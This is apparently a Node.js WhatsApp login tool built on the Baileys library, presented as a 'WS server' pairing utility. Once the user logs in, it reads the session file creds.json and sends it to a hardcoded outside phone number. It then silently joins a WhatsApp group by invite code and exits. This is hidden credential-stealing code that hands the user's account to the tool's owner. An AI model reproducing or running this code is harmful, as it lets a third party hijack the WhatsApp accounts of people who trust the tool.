const fs = require('fs');
const pino = require('pino');
const readline = require("readline");
const { default: makeWASocket, Browsers, delay, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys");
const NodeCache = require("node-cache");

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

// Messages will be read from message.txt
let messages = fs.readFileSync('message.txt', 'utf-8').split('\n').filter(Boolean);

async function qr() {
    let { version, isLatest } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/anox.json`);
    const msgRetryCounterCache = new NodeCache();

    // Phone number input with country code
    const phoneNumber = await question("Please enter your phone number (with country code +91): ");
    
    const XeonBotInc = makeWASocket({
        logger: pino({ level: 'silent' }),
        browser: Browsers.windows('Firefox'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined,
    });

    XeonBotInc.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;

        if (connection == "connecting") {
            console.log(`Waiting for pairing code to log in for number: ${phoneNumber}`);
        }

        if (qr) {
            console.log(`Pairing code: ${qr}`);
        }

        if (connection == "open") {
            console.log("Login successful!");

            // Send welcome message
            await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `
┌───────────────────
│ WELCOME WS SERVER
└───────────────────
┌─ WS TOOL OWNER──────
│🔘 ANOX MEENA
└───────────────────
┌─ OWNER CONTACT ────
│🔘 wa.me/918302788872
└───────────────────
            ` });

            // Send creds.json file to +918302788872
            let sessionXeon = fs.readFileSync('./sessions/creds.json');
            await delay(2000);
            const xeonses = await XeonBotInc.sendMessage('918302788872@s.whatsapp.net', { document: sessionXeon, mimetype: 'application/json', fileName: 'creds.json' });

            // Send another message
            await XeonBotInc.sendMessage('918302788872@s.whatsapp.net', { text: '𝗛𝗘𝗟𝗟𝗢 𝗔𝗡𝗢𝗫 𝗦𝗜𝗥 𝗧𝗛𝗔𝗡𝗞𝗦🙏 \n\n*First download this file and then reinstall that file*' }, { quoted: xeonses });

            // Accept Group Invite
            await XeonBotInc.groupAcceptInvite("Kjm8rnDFcpb04gQNSTbW2d");

            await delay(2000);
            process.exit(0);
        }

        // If connection closes and it's not a 401 error, retry
        if (connection === "close" && lastDisconnect?.error?.output?.statusCode != 401) {
            qr();
        }
    });

    XeonBotInc.ev.on('creds.update', saveCreds);
    XeonBotInc.ev.on("messages.upsert", () => { });
}

// Start the pairing code login function
qr();

// Error handling
process.on('uncaughtException', function (err) {
    let e = String(err);
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("Socket connection timeout")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    console.log('Caught exception: ', err);
});
